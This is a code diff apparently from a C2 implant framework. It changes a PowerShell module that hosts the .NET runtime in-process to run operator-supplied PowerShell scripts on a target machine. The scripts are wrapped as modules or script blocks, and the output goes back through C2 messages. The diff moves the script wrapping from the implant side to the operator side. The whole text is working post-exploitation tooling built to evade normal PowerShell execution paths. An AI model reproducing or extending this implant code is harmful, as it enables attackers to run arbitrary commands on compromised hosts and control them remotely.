@@ -42,10 +42,6 @@ typedef HRESULT (WINAPI *funcCorBindToRuntime)(
 	LPVOID*  ppv);
 
 
-extern const unsigned int PowerShellRunner_dll_len;
-extern unsigned char PowerShellRunner_dll[];
-
-
 bool createDotNetFourHost(HMODULE* hMscoree, const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
 {
 	HRESULT hr = NULL;
@@ -254,8 +250,24 @@ int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 			return -1;
 		}
 
-		std::string payload(std::istreambuf_iterator<char>(myfile), {});
 		c2Message.set_inputfile(inputFile);
+
+		std::string payload;
+		std::string fileContent(std::istreambuf_iterator<char>(myfile), {});
+
+		if(splitedCmd[1]=="-i")
+		{
+			payload = "New-Module -ScriptBlock {\n";
+			payload+=fileContent;
+			payload +="\nExport-ModuleMember -Function * -Alias *;};";
+		}
+		else if(splitedCmd[1]=="-s")
+		{
+			payload += "Invoke-Command -ScriptBlock  {\n";
+			payload += fileContent;
+			payload += "};";
+		}
+
 		c2Message.set_data(payload.data(), payload.size());
 
 		myfile.close();
@@ -280,11 +292,8 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 		if(splitedCmd[0]=="-i")
 		{
 			const std::string buffer = c2Message.data();
-			std::string finalCmd = "New-Module -ScriptBlock {\n";
-			finalCmd+=buffer;
-			finalCmd +="\nExport-ModuleMember -Function * -Alias *;};";
 
-			m_modulesToImport+=finalCmd;
+			m_modulesToImport+=buffer;
 
 			std::string outCmd = execPowershell(m_modulesToImport);
 			c2RetMessage.set_instruction(c2RetMessage.instruction());
@@ -292,20 +301,6 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 			c2RetMessage.set_returnvalue(outCmd);
 			return 0;
 
-		}
-		if(splitedCmd[0]=="-s")
-		{
-			const std::string buffer = c2Message.data();
-			std::string finalCmd = m_modulesToImport;
-			finalCmd += "Invoke-Command -ScriptBlock  {\n";
-			finalCmd += buffer;
-			finalCmd += "};";
-
-			std::string outCmd = execPowershell(finalCmd);
-			c2RetMessage.set_instruction(c2RetMessage.instruction());
-			c2RetMessage.set_cmd(cmd);
-			c2RetMessage.set_returnvalue(outCmd);
-			return 0;
 		}
 	}
 
@@ -441,8 +436,7 @@ std::string Powershell::execPowershell(const std::string& cmd)
 	if (pCorRuntimeHost)
 	{
 		wstring wide_string = wstring(cmd.begin(), cmd.end());
-		wchar_t* argument = wide_string.data();
-		
+		wchar_t* argument = wide_string.data();		
 		InvokeMethod(spType, L"InvokePS", argument, result);
 	}
 
